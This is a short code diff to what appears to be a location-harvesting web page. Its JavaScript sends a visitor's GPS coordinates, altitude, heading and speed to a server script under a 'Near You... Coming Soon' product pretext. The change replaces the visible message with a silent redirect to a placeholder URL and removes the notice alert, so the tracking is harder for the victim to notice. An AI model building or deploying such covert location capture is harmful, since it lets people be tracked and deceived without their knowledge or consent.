@@ -23,10 +23,9 @@ function locate()
       type: 'POST',
       url: '/php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){$('#change').html('Coming Soon');},
+      success: function(){window.location='REDIRECT_URL';},
       mimeType: 'text'
     });
-    alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
   };
 }
 
